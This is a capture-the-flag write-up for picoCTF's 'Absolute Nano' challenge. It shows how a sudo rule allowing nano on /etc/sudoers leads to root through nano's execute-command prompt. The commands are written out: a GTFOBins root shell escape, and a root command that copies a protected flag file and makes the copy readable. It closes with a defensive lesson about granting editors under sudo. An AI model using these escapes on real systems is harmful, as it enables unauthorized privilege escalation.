---
title: "ABSOLUTE NANO"
description: "picoCTF Absolute Nano writeup using GTFOBins nano technique with sudo privileges to escalate access and read the flag file."
category: "picoCTF - General Skills"
tags: ["picoctf", "general-skills"]
published: true
---
# ABSOLUTE NANO

## Challenge

**Category:** General Skills  
**Name:** ABSOLUTE NANO

**Prompt summary:**

- SSH access is provided
- hint: "What can you do with nano?"

## Goal

Use the allowed `nano` capability to escalate privileges or read the protected flag.

## Initial access

Connect with SSH:

```bash
ssh -p 55799 ctf-player@crystal-peak.picoctf.net
```

Password:

```text
46cb0c29
```

## Step 1: Inspect the environment

Once connected, basic recon showed:

```bash
ls -la
id
sudo -l
```

Important findings:

```text
-r--r----- 1 root root 35 ... flag.txt
```

So `flag.txt` exists in the home directory but is only readable by `root`.

The key `sudo` rule was:

```text
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

That means:

- we cannot run arbitrary `sudo`
- but we *can* run `nano` as root on `/etc/sudoers`

This is enough, because `nano` has multiple GTFOBins-style escape and file-access features.

## Relevant nano techniques

The useful `nano` techniques here are:

### 1. Execute a command from inside nano

Inside `nano`:

```text
^R^X
```

Then enter a shell command.

This is the most reliable route for this challenge because `nano` is running as `root` via `sudo`.

### 2. Spawn a shell from inside nano

Also from GTFOBins:

```text
^R^X
reset; sh 1>&0 2>&0
```

This can produce a root shell when terminal behavior cooperates.

### 3. Use spell checker hooks

If `SPELL` or `-s` is controllable, `nano` can be turned into a shell launcher through spell-check execution.

That technique is valid in general, but it was not necessary here.

### 4. Read arbitrary files

Since `nano` is running as root, it can also read protected files into the editor buffer.

Again, valid, but less convenient over a remote interactive TTY than just executing a root command.

## Chosen path

The cleanest solve was:

1. run `sudo /bin/nano /etc/sudoers`
2. use `^R^X`
3. execute a root command that copies the protected flag to a readable file
4. reconnect and read the copied file normally

## Step 2: Start root nano

Because some terminals cause issues with `nano`, set a simple terminal type first:

```bash
export TERM=xterm
sudo /bin/nano /etc/sudoers
```

## Step 3: Use nano's execute-command feature

Inside `nano`, press:

```text
Ctrl-R
Ctrl-X
```

That opens the `Command to execute:` prompt.

At that prompt, run:

```bash
cp /home/ctf-player/flag.txt /home/ctf-player/flag_copy.txt; chmod 644 /home/ctf-player/flag_copy.txt
```

Why this works:

- `nano` is running as `root`
- the command therefore runs as `root`
- it copies the protected file
- then makes the copy world-readable

This avoids relying on a fully interactive root shell.

## Step 4: Read the copied flag

After the root command succeeds:

```bash
cat /home/ctf-player/flag_copy.txt
```

Output:

```text
picoCTF{<redacted>}
```

## Flag

```text
picoCTF{<redacted>}
```

## Why this works

The challenge is about treating `nano` as more than a text editor.

Granting:

```text
sudo /bin/nano /etc/sudoers
```

is effectively dangerous because `nano` is not a passive editor. It can:

- read arbitrary files
- execute commands
- sometimes spawn shells

So the sudo rule accidentally grants root-level actions even though it appears restricted.

## Minimal solve path

```bash
ssh -p 55799 ctf-player@crystal-peak.picoctf.net
export TERM=xterm
sudo /bin/nano /etc/sudoers
```

Inside `nano`:

```text
Ctrl-R
Ctrl-X
```

Command:

```bash
cp /home/ctf-player/flag.txt /home/ctf-player/flag_copy.txt; chmod 644 /home/ctf-player/flag_copy.txt
```

Back in the shell:

```bash
cat /home/ctf-player/flag_copy.txt
```

## Takeaway

Allowing editors under `sudo` is often equivalent to allowing command execution. `nano`, `vi`, `vim`, `less`, and similar programs can frequently be abused for shell escape, file read, or privilege escalation.
